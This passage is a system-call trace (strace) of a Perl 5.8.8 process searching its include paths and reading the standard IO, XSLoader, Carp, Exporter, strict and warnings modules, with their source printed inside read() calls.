11347 07:37:14.571627 stat64("/usr/local/share/perl/5.8.8/IO.pmc", 0xbfb620bc) = -1 ENOENT (No such file or directory)
11347 07:37:14.571639 stat64("/usr/local/share/perl/5.8.8/IO.pm", 0xbfb61fcc) = -1 ENOENT (No such file or directory)
11347 07:37:14.571653 stat64("/usr/lib/perl5/IO.pmc", 0xbfb620bc) = -1 ENOENT (No such file or directory)
11347 07:37:14.571665 stat64("/usr/lib/perl5/IO.pm", 0xbfb61fcc) = -1 ENOENT (No such file or directory)
11347 07:37:14.571678 stat64("/usr/share/perl5/IO.pmc", 0xbfb620bc) = -1 ENOENT (No such file or directory)
11347 07:37:14.571689 stat64("/usr/share/perl5/IO.pm", 0xbfb61fcc) = -1 ENOENT (No such file or directory)
11347 07:37:14.571702 stat64("/usr/lib/perl/5.8/IO.pmc", 0xbfb620bc) = -1 ENOENT (No such file or directory)
11347 07:37:14.571715 stat64("/usr/lib/perl/5.8/IO.pm", {st_mode=S_IFREG|0644, st_size=413, ...}) = 0
11347 07:37:14.571736 open("/usr/lib/perl/5.8/IO.pm", O_RDONLY|O_LARGEFILE) = 6
11347 07:37:14.571749 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb61dd8) = -1 ENOTTY (Inappropriate ioctl for device)
11347 07:37:14.571760 _llseek(6, 0, [0], SEEK_CUR) = 0
11347 07:37:14.571866 read(6, "#\n\npackage IO;\n\nuse XSLoader ();\nuse Carp;\nuse strict;\nuse warnings;\n\nour $VERSION = \"1.22\";\nXSLoader::load \'IO\', $VERSION;\n\nsub import {\n    shift;\n\n    warnings::warnif(\'deprecated\', qq{Parameterless \"use IO\" deprecated})\n        if @_ == 0 ;\n    \n    my @l = @_ ? @_ : qw(Handle Seekable File Pipe Socket Dir);\n\n    eval join(\"\", map { \"require IO::\" . (/(\\w+)/)[0] . \";\\n\" } @l)\n\tor croak $@;\n}\n\n1;\n\n__END__\n\n", 4096) = 413
11347 07:37:14.571924 stat64("/etc/perl/XSLoader.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.571938 stat64("/etc/perl/XSLoader.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.571951 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.571964 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.571978 stat64("/usr/local/share/perl/5.8.8/XSLoader.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.571991 stat64("/usr/local/share/perl/5.8.8/XSLoader.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.572008 stat64("/usr/lib/perl5/XSLoader.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.572020 stat64("/usr/lib/perl5/XSLoader.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.572033 stat64("/usr/share/perl5/XSLoader.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.572045 stat64("/usr/share/perl5/XSLoader.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.572059 stat64("/usr/lib/perl/5.8/XSLoader.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.572071 stat64("/usr/lib/perl/5.8/XSLoader.pm", {st_mode=S_IFREG|0644, st_size=3408, ...}) = 0
11347 07:37:14.572092 open("/usr/lib/perl/5.8/XSLoader.pm", O_RDONLY|O_LARGEFILE) = 8
11347 07:37:14.572106 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb61928) = -1 ENOTTY (Inappropriate ioctl for device)
11347 07:37:14.572117 _llseek(8, 0, [0], SEEK_CUR) = 0
11347 07:37:14.572134 read(8, "# Generated from XSLoader.pm.PL (resolved %Config::Config value)\n\npackage XSLoader;\n\n$VERSION = \"0.06\";\n\n#use strict;\n\n# enable debug/trace messages from DynaLoader perl code\n# $dl_debug = $ENV{PERL_DL_DEBUG} || 0 unless defined $dl_debug;\n\n  my $dl_dlext = \'so\';\n\npackage DynaLoader;\n\n# No prizes for guessing why we don\'t say \'bootstrap DynaLoader;\' here.\n# NOTE: All dl_*.xs (including dl_none.xs) define a dl_error() XSUB\nboot_DynaLoader(\'DynaLoader\') if defined(&boot_DynaLoader) &&\n                                !defined(&dl_error);\npackage XSLoader;\n\nsub load {\n    package DynaLoader;\n\n    die q{XSLoader::load(\'Your::Module\', $Your::Module::VERSION)} unless @_;\n\n    my($module) = $_[0];\n\n    # work with static linking too\n    my $b = \"$module\\::bootstrap\";\n    goto &$b if defined &$b;\n\n    goto retry unless $module and defined &dl_load_file;\n\n    my @modparts = split(/::/,$module);\n    my $modfname = $modparts[-1];\n\n    my $modpname = join(\'/\',@modparts);\n    my $modlibname = (caller())[1];\n    my $c = @modparts;\n    $modlibname =~ s,[\\\\/][^\\\\/]+$,, while $c--;\t# Q&D basename\n    my $file = \"$modlibname/auto/$modpname/$modfname.$dl_dlext\";\n\n#   print STDERR \"XSLoader::load for $module ($file)\\n\" if $dl_debug;\n\n    my $bs = $file;\n    $bs =~ s/(\\.\\w+)?(;\\d*)?$/\\.bs/; # look for .bs \'beside\' the library\n\n    goto retry if not -f $file or -s $bs;\n\n    my $bootname = \"boot_$module\";\n    $bootname =~ s/\\W/_/g;\n    @DynaLoader::dl_require_symbols = ($bootname);\n\n    my $boot_symbol_ref;\n\n    if ($^O eq \'darwin\') {\n        if ($boot_symbol_ref = dl_find_symbol(0, $bootname)) {\n            goto boot; #extension library has already been loaded, e.g. darwin\n        }\n    }\n\n    # Many dynamic extension loading problems will appear to come from\n    # this section of code: XYZ failed at line 123 of DynaLoader.pm.\n    # Often these errors are actually occurring in the initialisation\n    # C code of the extension XS file. Perl reports the error as being\n    # in this perl code simply because this was the last perl code\n    # it executed.\n\n    my $libref = dl_load_file($file, 0) or do { \n        require Carp;\n        Carp::croak(\"Can\'t load \'$file\' for module $module: \" . dl_error());\n    };\n    push(@DynaLoader::dl_librefs,$libref);  # record loaded object\n\n    my @unresolved = dl_undef_symbols();\n    if (@unresolved) {\n        require Carp;\n        Carp::carp(\"Undefined symbols present after loading $file: @unresolved\\n\");\n    }\n\n    $boot_symbol_ref = dl_find_symbol($libref, $bootname) or do {\n        require Carp;\n        Carp::croak(\"Can\'t find \'$bootname\' symbol in $file\\n\");\n    };\n\n    push(@DynaLoader::dl_modules, $module); # record loaded module\n\n  boot:\n    my $xs = dl_install_xsub(\"${module}::bootstrap\", $boot_symbol_ref, $file);\n\n    # See comment block above\n    return &$xs(@_);\n\n  retry:\n    my $bootstrap_inherit = DynaLoader->can(\'bootstrap_inherit\') || \n                            XSLoader->can(\'bootstrap_inherit\');\n    goto &$bootstrap_inherit;\n}\n\n# Versions of DynaLoader prior to 5.6.0 don\'t have this function.\nsub bootstrap_inherit {\n    package DynaLoader;\n\n    my $module = $_[0];\n    local *DynaLoader::isa = *{\"$module\\::ISA\"};\n    local @DynaLoader::isa = (@DynaLoader::isa, \'DynaLoader\');\n    # Cannot goto due to delocalization.  Will report errors on a wrong line?\n    require DynaLoader;\n    DynaLoader::bootstrap(@_);\n}\n\n1;\n\n__END__\n\n", 4096) = 3408
11347 07:37:14.572383 brk(0x8195000)    = 0x8195000
11347 07:37:14.572688 _llseek(8, 3407, [3407], SEEK_SET) = 0
11347 07:37:14.572705 _llseek(8, 0, [3407], SEEK_CUR) = 0
11347 07:37:14.572716 close(8)          = 0
11347 07:37:14.572761 stat64("/etc/perl/Carp.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.572776 stat64("/etc/perl/Carp.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.572790 stat64("/usr/local/lib/perl/5.8.8/Carp.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.572803 stat64("/usr/local/lib/perl/5.8.8/Carp.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.572817 stat64("/usr/local/share/perl/5.8.8/Carp.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.572829 stat64("/usr/local/share/perl/5.8.8/Carp.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.572853 stat64("/usr/lib/perl5/Carp.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.572865 stat64("/usr/lib/perl5/Carp.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.572878 stat64("/usr/share/perl5/Carp.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.572890 stat64("/usr/share/perl5/Carp.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.572903 stat64("/usr/lib/perl/5.8/Carp.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.572915 stat64("/usr/lib/perl/5.8/Carp.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.572929 stat64("/usr/share/perl/5.8/Carp.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.572942 stat64("/usr/share/perl/5.8/Carp.pm", {st_mode=S_IFREG|0644, st_size=4112, ...}) = 0
11347 07:37:14.572963 open("/usr/share/perl/5.8/Carp.pm", O_RDONLY|O_LARGEFILE) = 8
11347 07:37:14.572977 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb61928) = -1 ENOTTY (Inappropriate ioctl for device)
11347 07:37:14.572989 _llseek(8, 0, [0], SEEK_CUR) = 0
11347 07:37:14.573006 read(8, "package Carp;\n\nour $VERSION = \'1.04\';\n\n# This package is heavily used. Be small. Be fast. Be good.\n\n# Comments added by Andy Wardley <abw@kfs.org> 09-Apr-98, based on an\n# _almost_ complete understanding of the package.  Corrections and\n# comments are welcome.\n\n# The members of %Internal are packages that are internal to perl.\n# Carp will not report errors from within these packages if it\n# can.  The members of %CarpInternal are internal to Perl\'s warning\n# system.  Carp will not report errors from within these packages\n# either, and will not report calls *to* these packages for carp and\n# croak.  They replace $CarpLevel, which is deprecated.    The\n# $Max(EvalLen|(Arg(Len|Nums)) variables are used to specify how the eval\n# text and function arguments should be formatted when printed.\n\n# Comments added by Jos I. Boumans <kane@dwim.org> 11-Aug-2004\n# I can not get %CarpInternal or %Internal to work as advertised,\n# therefor leaving it out of the below documentation.\n# $CarpLevel may be decprecated according to the last comment, but\n# after 6 years, it\'s still around and in heavy use ;)\n\n$CarpInternal{Carp}++;\n$CarpInternal{warnings}++;\n$CarpLevel = 0;     # How many extra package levels to skip on carp.\n                    # How many calls to skip on confess.\n                    # Reconciling these notions is hard, use\n                    # %Internal and %CarpInternal instead.\n$MaxEvalLen = 0;    # How much eval \'...text...\' to show. 0 = all.\n$MaxArgLen = 64;    # How much of each argument to print. 0 = all.\n$MaxArgNums = 8;    # How many arguments to print. 0 = all.\n$Verbose = 0;       # If true then make shortmess call longmess instead\n\nrequire Exporter;\n@ISA = (\'Exporter\');\n@EXPORT = qw(confess croak carp);\n@EXPORT_OK = qw(cluck verbose longmess shortmess);\n@EXPORT_FAIL = qw(verbose);\t# hook to enable verbose mode\n\n# if the caller specifies verbose usage (\"perl -MCarp=verbose script.pl\")\n# then the following method will be called by the Exporter which knows\n# to do this thanks to @EXPORT_FAIL, above.  $_[1] will contain the word\n# \'verbose\'.\n\nsub export_fail {\n    shift;\n    $Verbose = shift if $_[0] eq \'verbose\';\n    return @_;\n}\n\n# longmess() crawls all the way up the stack reporting on all the function\n# calls made.  The error string, $error, is originally constructed from the\n# arguments passed into longmess() via confess(), cluck() or shortmess().\n# This gets appended with the stack trace messages which are generated for\n# each function call on the stack.\n\nsub longmess {\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    if ($Internal{$call_pack} or $CarpInternal{$call_pack}) {\n      return longmess_heavy(@_);\n    }\n    else {\n      local $CarpLevel = $CarpLevel + 1;\n      return longmess_heavy(@_);\n    }\n}\n\n# shortmess() is called by carp() and croak() to skip all the way up to\n# the top-level caller\'s package and report the error from there.  confess()\n# and cluck() generate a full stack trace so they call longmess() to\n# generate that.  In verbose mode shortmess() calls longmess() so\n# you always get a stack trace\n\nsub shortmess {\t# Short-circuit &longmess if called via multiple packages\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    local @CARP_NOT = caller();\n    shortmess_heavy(@_);\n}\n\n# the following four functions call longmess() or shortmess() depending on\n# whether they should generate a full stack trace (confess() and cluck())\n# or simply report the caller\'s package (croak() and carp()), respectively.\n# confess() and croak() die, carp() and cluck() warn.\n\nsub croak   { die  shortmess @_ }\nsub confess { die  longmess  @_ }\nsub carp    { warn shortmess @_ }\nsub cluck   { warn lon", 4096) = 4096
11347 07:37:14.573450 read(8, "gmess  @_ }\n\n1;\n", 4096) = 16
11347 07:37:14.573478 read(8, "", 4096) = 0
11347 07:37:14.573490 close(8)          = 0
11347 07:37:14.573511 stat64("/etc/perl/Exporter.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.573525 stat64("/etc/perl/Exporter.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.573539 stat64("/usr/local/lib/perl/5.8.8/Exporter.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.573552 stat64("/usr/local/lib/perl/5.8.8/Exporter.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.573565 stat64("/usr/local/share/perl/5.8.8/Exporter.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.573578 stat64("/usr/local/share/perl/5.8.8/Exporter.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.573592 stat64("/usr/lib/perl5/Exporter.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.573604 stat64("/usr/lib/perl5/Exporter.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.573617 stat64("/usr/share/perl5/Exporter.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.573629 stat64("/usr/share/perl5/Exporter.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.573643 stat64("/usr/lib/perl/5.8/Exporter.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.573659 stat64("/usr/lib/perl/5.8/Exporter.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.573673 stat64("/usr/share/perl/5.8/Exporter.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.573686 stat64("/usr/share/perl/5.8/Exporter.pm", {st_mode=S_IFREG|0644, st_size=2218, ...}) = 0
11347 07:37:14.573707 open("/usr/share/perl/5.8/Exporter.pm", O_RDONLY|O_LARGEFILE) = 8
11347 07:37:14.573721 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb61928) = -1 ENOTTY (Inappropriate ioctl for device)
11347 07:37:14.573733 _llseek(8, 0, [0], SEEK_CUR) = 0
11347 07:37:14.573749 read(8, "package Exporter;\n\nrequire 5.006;\n\n# Be lean.\n#use strict;\n#no strict \'refs\';\n\nour $Debug = 0;\nour $ExportLevel = 0;\nour $Verbose ||= 0;\nour $VERSION = \'5.58\';\nour (%Cache);\n$Carp::Internal{Exporter} = 1;\n\nsub as_heavy {\n  require Exporter::Heavy;\n  # Unfortunately, this does not work if the caller is aliased as *name = \\&foo\n  # Thus the need to create a lot of identical subroutines\n  my $c = (caller(1))[3];\n  $c =~ s/.*:://;\n  \\&{\"Exporter::Heavy::heavy_$c\"};\n}\n\nsub export {\n  goto &{as_heavy()};\n}\n\nsub import {\n  my $pkg = shift;\n  my $callpkg = caller($ExportLevel);\n\n  if ($pkg eq \"Exporter\" and @_ and $_[0] eq \"import\") {\n    *{$callpkg.\"::import\"} = \\&import;\n    return;\n  }\n\n  # We *need* to treat @{\"$pkg\\::EXPORT_FAIL\"} since Carp uses it :-(\n  my($exports, $fail) = (\\@{\"$pkg\\::EXPORT\"}, \\@{\"$pkg\\::EXPORT_FAIL\"});\n  return export $pkg, $callpkg, @_\n    if $Verbose or $Debug or @$fail > 1;\n  my $export_cache = ($Cache{$pkg} ||= {});\n  my $args = @_ or @_ = @$exports;\n\n  local $_;\n  if ($args and not %$export_cache) {\n    s/^&//, $export_cache->{$_} = 1\n      foreach (@$exports, @{\"$pkg\\::EXPORT_OK\"});\n  }\n  my $heavy;\n  # Try very hard not to use {} and hence have to  enter scope on the foreach\n  # We bomb out of the loop with last as soon as heavy is set.\n  if ($args or $fail) {\n    ($heavy = (/\\W/ or $args and not exists $export_cache->{$_}\n               or @$fail and $_ eq $fail->[0])) and last\n                 foreach (@_);\n  } else {\n    ($heavy = /\\W/) and last\n      foreach (@_);\n  }\n  return export $pkg, $callpkg, ($args ? @_ : ()) if $heavy;\n  local $SIG{__WARN__} = \n\tsub {require Carp; &Carp::carp};\n  # shortcut for the common case of no type character\n  *{\"$callpkg\\::$_\"} = \\&{\"$pkg\\::$_\"} foreach @_;\n}\n\n# Default methods\n\nsub export_fail {\n    my $self = shift;\n    @_;\n}\n\n# Unfortunately, caller(1)[3] \"does not work\" if the caller is aliased as\n# *name = \\&foo.  Thus the need to create a lot of identical subroutines\n# Otherwise we could have aliased them to export().\n\nsub export_to_level {\n  goto &{as_heavy()};\n}\n\nsub export_tags {\n  goto &{as_heavy()};\n}\n\nsub export_ok_tags {\n  goto &{as_heavy()};\n}\n\nsub require_version {\n  goto &{as_heavy()};\n}\n\n1;\n__END__\n\n", 4096) = 2218
11347 07:37:14.574238 _llseek(8, 2217, [2217], SEEK_SET) = 0
11347 07:37:14.574255 _llseek(8, 0, [2217], SEEK_CUR) = 0
11347 07:37:14.574266 close(8)          = 0
11347 07:37:14.574365 stat64("/etc/perl/strict.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.574384 stat64("/etc/perl/strict.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.574397 stat64("/usr/local/lib/perl/5.8.8/strict.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.574410 stat64("/usr/local/lib/perl/5.8.8/strict.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.574424 stat64("/usr/local/share/perl/5.8.8/strict.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.574436 stat64("/usr/local/share/perl/5.8.8/strict.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.574450 stat64("/usr/lib/perl5/strict.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.574462 stat64("/usr/lib/perl5/strict.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.574479 stat64("/usr/share/perl5/strict.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.574491 stat64("/usr/share/perl5/strict.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.574505 stat64("/usr/lib/perl/5.8/strict.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.574517 stat64("/usr/lib/perl/5.8/strict.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.574531 stat64("/usr/share/perl/5.8/strict.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.574543 stat64("/usr/share/perl/5.8/strict.pm", {st_mode=S_IFREG|0644, st_size=599, ...}) = 0
11347 07:37:14.574564 open("/usr/share/perl/5.8/strict.pm", O_RDONLY|O_LARGEFILE) = 8
11347 07:37:14.574579 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb61928) = -1 ENOTTY (Inappropriate ioctl for device)
11347 07:37:14.574591 _llseek(8, 0, [0], SEEK_CUR) = 0
11347 07:37:14.574610 read(8, "package strict;\n\n$strict::VERSION = \"1.03\";\n\nmy %bitmask = (\nrefs => 0x00000002,\nsubs => 0x00000200,\nvars => 0x00000400\n);\n\nsub bits {\n    my $bits = 0;\n    my @wrong;\n    foreach my $s (@_) {\n\tpush @wrong, $s unless exists $bitmask{$s};\n        $bits |= $bitmask{$s} || 0;\n    }\n    if (@wrong) {\n        require Carp;\n        Carp::croak(\"Unknown \'strict\' tag(s) \'@wrong\'\");\n    }\n    $bits;\n}\n\nmy $default_bits = bits(qw(refs subs vars));\n\nsub import {\n    shift;\n    $^H |= @_ ? bits(@_) : $default_bits;\n}\n\nsub unimport {\n    shift;\n    $^H &= ~ (@_ ? bits(@_) : $default_bits);\n}\n\n1;\n__END__\n\n", 4096) = 599
11347 07:37:14.574752 _llseek(8, 598, [598], SEEK_SET) = 0
11347 07:37:14.574766 _llseek(8, 0, [598], SEEK_CUR) = 0
11347 07:37:14.574776 close(8)          = 0
11347 07:37:14.574815 stat64("/etc/perl/warnings.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.574840 stat64("/etc/perl/warnings.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.574854 stat64("/usr/local/lib/perl/5.8.8/warnings.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.574867 stat64("/usr/local/lib/perl/5.8.8/warnings.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.574881 stat64("/usr/local/share/perl/5.8.8/warnings.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.574894 stat64("/usr/local/share/perl/5.8.8/warnings.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.574908 stat64("/usr/lib/perl5/warnings.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.574919 stat64("/usr/lib/perl5/warnings.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.574933 stat64("/usr/share/perl5/warnings.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.574945 stat64("/usr/share/perl5/warnings.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.574958 stat64("/usr/lib/perl/5.8/warnings.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.574971 stat64("/usr/lib/perl/5.8/warnings.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.574984 stat64("/usr/share/perl/5.8/warnings.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.574997 stat64("/usr/share/perl/5.8/warnings.pm", {st_mode=S_IFREG|0644, st_size=13018, ...}) = 0
11347 07:37:14.575018 open("/usr/share/perl/5.8/warnings.pm", O_RDONLY|O_LARGEFILE) = 8
11347 07:37:14.575032 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb61928) = -1 ENOTTY (Inappropriate ioctl for device)
11347 07:37:14.575044 _llseek(8, 0, [0], SEEK_CUR) = 0
11347 07:37:14.575062 read(8, "# -*- buffer-read-only: t -*-\n# !!!!!!!   DO NOT EDIT THIS FILE   !!!!!!!\n# This file was created by warnings.pl\n# Any changes made here will be lost.\n#\n\npackage warnings;\n\nour $VERSION = \'1.05\';\n\nuse Carp ();\n\nour %Offsets = (\n\n    # Warnings Categories added in Perl 5.008\n\n    \'all\'\t\t=> 0,\n    \'closure\'\t\t=> 2,\n    \'deprecated\'\t=> 4,\n    \'exiting\'\t\t=> 6,\n    \'glob\'\t\t=> 8,\n    \'io\'\t\t=> 10,\n    \'closed\'\t\t=> 12,\n    \'exec\'\t\t=> 14,\n    \'layer\'\t\t=> 16,\n    \'newline\'\t\t=> 18,\n    \'pipe\'\t\t=> 20,\n    \'unopened\'\t\t=> 22,\n    \'misc\'\t\t=> 24,\n    \'numeric\'\t\t=> 26,\n    \'once\'\t\t=> 28,\n    \'overflow\'\t\t=> 30,\n    \'pack\'\t\t=> 32,\n    \'portable\'\t\t=> 34,\n    \'recursion\'\t\t=> 36,\n    \'redefine\'\t\t=> 38,\n    \'regexp\'\t\t=> 40,\n    \'severe\'\t\t=> 42,\n    \'debugging\'\t\t=> 44,\n    \'inplace\'\t\t=> 46,\n    \'internal\'\t\t=> 48,\n    \'malloc\'\t\t=> 50,\n    \'signal\'\t\t=> 52,\n    \'substr\'\t\t=> 54,\n    \'syntax\'\t\t=> 56,\n    \'ambiguous\'\t\t=> 58,\n    \'bareword\'\t\t=> 60,\n    \'digit\'\t\t=> 62,\n    \'parenthesis\'\t=> 64,\n    \'precedence\'\t=> 66,\n    \'printf\'\t\t=> 68,\n    \'prototype\'\t\t=> 70,\n    \'qw\'\t\t=> 72,\n    \'reserved\'\t\t=> 74,\n    \'semicolon\'\t\t=> 76,\n    \'taint\'\t\t=> 78,\n    \'threads\'\t\t=> 80,\n    \'uninitialized\'\t=> 82,\n    \'unpack\'\t\t=> 84,\n    \'untie\'\t\t=> 86,\n    \'utf8\'\t\t=> 88,\n    \'void\'\t\t=> 90,\n    \'y2k\'\t\t=> 92,\n  );\n\nour %Bits = (\n    \'all\'\t\t=> \"\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x15\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\x54\\x55\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\", # [34]\n    